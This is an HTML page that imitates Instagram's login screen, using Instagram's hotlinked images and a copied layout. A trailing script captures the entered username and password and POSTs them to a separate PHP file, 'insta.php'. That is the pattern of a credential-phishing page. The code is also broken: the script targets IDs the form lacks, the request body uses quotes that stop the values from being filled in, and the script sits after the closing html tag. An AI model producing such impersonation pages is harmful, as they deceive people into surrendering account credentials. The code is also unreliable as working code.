<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="instagram login.css">
        <title>Instagram Login</title>
    </head>
    <style>
        *{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

:root{
    font-size: 10px;
}

body{
    font-family: Arial, Helvetica, sans-serif;
    line-height: 1.5;
    background-color: black;
}

/* containers */

.wrapper{
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100dvh;
}

.box1{
    display: none;
}

.box2{
    width: 35rem;

    
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 1rem;
}

.loginBox{
    background-color: rgba(53, 2, 2, 0.235);
    border: 1px solid rgba(219, 219, 219, 0);
    border-radius: 15px;

    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 1rem;
    width: 100%;

    padding: 2rem 0;
}


.logo{
    object-fit: cover;
    object-position: 0px -51px;
    width: 175px;
    height: 51px;
    background-repeat: no-repeat;  
    margin: 2rem; 
}

.form{
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 1rem;
    padding: 1rem 4rem; 
    width: 100%;
}


.input, .logbtn{
    width: 100%;
    padding: 1.1rem;
    border-radius: 0.5rem;
    border: none;
}

.input{
    border: 1px solid #acacac;
    background-color: rgba(240, 240, 240, 0.815);
    font-size: 1.2rem;
    outline: none;
}

.input:focus{
    border: 1px solid #929292;
}

.logbtn{
    background-color: #2e9ee9;
    color: white;
    font-size: 1.5rem;
    font-weight: 900;
    border-radius: 1rem;
    padding: 0.9rem;
}

.logbtn:hover{
    background-color: #2897e0;
}

.division{
    display: flex;
    justify-content: center;
    width: 100%;
    padding: 1rem 4rem;
    color: rgb(134, 134, 134);
}

.hr{
    width: 100%;
    border: none;
    border-top: 1px solid rgba(134, 134, 134, 0.705);
    margin-top: 10px;
}

.or{
    margin: 0 3rem;
    font-size: 1.4rem;
    font-weight: bold;
    color: rgb(109, 108, 108);
}

.logfb{
    display: flex;
    justify-content: center;
    background-color: rgba(255, 255, 255, 0.146);
    align-items: center;
    gap: 0.5rem;
}
.logfb__icon{
    width: 16px;
    height: 16px;
    background-image: url('https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpWTmS.png');
    background-repeat: no-repeat;
    background-position: -414px -259px;
    height: 16px;
    width: 16px;
}

.logfb__link{
    text-decoration: none;
    font-weight: bold;
    font-size: 1.4rem;
    color: #1f3ea1;
}
.forget-password{
    margin: 1rem;
    color: #2040aa;
    text-decoration: none;
    font-size: 1.2rem;
}

.signupBox{
    width: 100%;
    padding: 2rem;
    font-size: 1.6rem;
    display: flex;
    justify-content: center;
 border-radius: 15px;

    background-color: rgba(255, 255, 255, 0.146);
    border: 1px solid rgba(219, 219, 219, 0);
}
.signup{
    text-decoration: none;
    border-radius: 0.1rem;
    font-weight: bold;
    color: #248ace;
}


.getAppBox{
    width: 100%;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    gap: 1rem;
    font-size: 1.5rem;
}

.store{
    width: 13.6rem;
}

.getAppBox-container{
    display: flex;
    gap: 0.7rem;
    padding-bottom: 1rem;
}

@media only screen and (min-width: 890px){
    .wrapper{
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 8rem;
    }

    .box1{
        height: 59.3rem;
        display: flex;
        justify-content: center;
        align-items: center;
        padding-top: 1.2rem;
        position: relative;
    }
    .photo2{
        max-width: 253px;
        height: 545px;
        object-fit: cover;
        position: absolute;
        right: 58px;
        top: 10px;
        border-radius: 23px;
    }
}
    </style>
    <body>
       <div class="wrapper">
            <!-- Box 1 -->
            <div class="box1">
                    <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?" alt="" class="photo">
                   
                    <img src="https://images.pexels.com/photos/2725253/pexels-photo-2725253.jpeg" alt="" class="photo2">
            </div>            
            <!-- Box 2 -->
            <div class="box2">
                <!-- Loginform -->
                <div class="loginBox">
                    <img src="C:\Users\Admin\OneDrive\Desktop\hd-instagram-logo-text-white-free-png-116726790456dxkukguk2.png" alt="logo" class="logo" >
                    <form action="#" class="form">
                            <input type="text" class="input" name="username" placeholder="Phone number, username or email address">
                            <input type="password" class="input" name="password" placeholder="Password">
                            <input type="button" class="logbtn" value="Log in"> 
                    </form>
                    <div class="division">
                        <div class="hr"></div>
                        <p class="or">OR</p>
                        <div class="hr"></div>
                    </div>
                    <div class="logfb">
                        <div class="logfb__icon"></div>
                        <a href="#" class="logfb__link">Log in with Facebook</a>
                    </div>
                    <a href="#" class="forget-password">Forgotten your password?</a>
                </div>
                <!-- signup -->
                <div class="signupBox">
                    <p>Don't have an account? <a href="#" class="signup">Sign up</a></p>
                </div>
                <!-- getApp -->
                <div class="getAppBox">
                    <p>Get the app.</p>
                    <div class="getAppBox-container"> 
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="appstore" class="store">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="playstore" class="store">
                    </div>
                </div>
                </div>       
       </div>
    </body>
</html>


    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(event) {
            event.preventDefault();

            let username = document.getElementById('username').value;
            let password = document.getElementById('password').value;

            if (!username || !password) {
                alert('Please fill in both fields');
                return;
            }

            // Send login data to PHP backend
            try {
                let response = await fetch('insta.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: 'username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}'
                });

                let result = await response.text();

                if (result === 'success') {
                    alert('Login successful!');
                } else {
                    alert('Invalid username or password');
                }
            } catch (error) {
                alert('Error connecting to server');
                console.error(error);
            }
        });
    </script>
</body>
</html>
